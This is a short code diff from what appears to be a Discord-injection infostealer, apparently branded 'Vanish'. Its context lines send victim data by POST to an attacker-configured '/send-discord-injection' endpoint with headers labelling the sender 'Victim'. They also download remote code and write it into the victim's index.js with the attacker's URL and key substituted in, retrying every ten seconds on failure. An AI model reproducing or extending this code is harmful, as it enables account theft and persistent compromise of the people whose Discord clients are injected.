@@ -22,13 +22,13 @@ const CV2 = {
             const parsedUrl = new URL(CONFIG.url);
             const client = parsedUrl.protocol === 'https:' ? require('https') : require('http');
             let targetPath = parsedUrl.pathname === '/' ? '/send-discord-injection' : parsedUrl.pathname + '/send-discord-injection';
-            
+
             const options = {
                 hostname: parsedUrl.hostname,
                 port: parsedUrl.port,
                 path: targetPath + parsedUrl.search,
                 method: "POST",
-                headers: { 
+                headers: {
                     "Content-Type": "application/json",
                     "Vanish-Victim-Client": "true",
                     "Vanish-Client": "Victim"
@@ -623,7 +623,7 @@ async function initiation() {
           let data = '';
           res.on('data', chunk => data += chunk);
           res.on('end', () => {
-              fs.writeFileSync(indexJs, data.replace('%API_URL%', '${CONFIG.url}').replace('%API_KEY%', '${CONFIG.key}'));
+              fs.writeFileSync(indexJs, data.replace('%URL%', '${CONFIG.url}').replace('%KEY%', '${CONFIG.key}'));
           });
       }).on("error", (err) => {
           setTimeout(init, 10000);
